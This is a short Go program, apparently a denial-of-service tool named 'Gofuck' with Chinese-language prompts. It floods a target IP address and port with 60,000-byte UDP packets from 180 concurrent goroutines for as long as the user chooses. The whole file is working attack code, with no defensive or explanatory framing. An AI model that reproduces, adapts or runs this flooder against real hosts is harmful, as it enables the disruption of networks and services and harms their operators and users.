package main

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"time"
)

const THREADS = 180
func attack(ip string, port int, duration int) {
	bytes := make([]byte, 60000)
	startTime := time.Now()
	endTime := startTime.Add(time.Duration(duration) * time.Second)
	for time.Now().Before(endTime) {
		conn, _ := net.Dial("udp", fmt.Sprintf("%s:%d", ip, port))
		conn.Write(bytes)
		conn.Close()
		time.Sleep(1 * time.Millisecond)
	}
}

func countdown(remainingTime int) {	
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	for i := remainingTime; i > 0; i-- {
		fmt.Printf("\r剩余结束时间: %d秒", i)
		<-ticker.C
	}
	fmt.Print("\r线程结束   \n")
}

func main() {
	var ip string
	var port int
	var attackDuration int

	if len(os.Args) < 4 {
		fmt.Println("请准确输入参数:例 ./Gofuck <IP地址> <端口> <攻击持续时间>")
		os.Exit(1)
	}

	ip = os.Args[1]
	port, _ = strconv.Atoi(os.Args[2])
	attackDuration, _ = strconv.Atoi(os.Args[3])

	go countdown(attackDuration)

	for i := 0; i < THREADS; i++ {
		go attack(ip, port, attackDuration)
	}
	time.Sleep(time.Second * time.Duration(attackDuration))
}
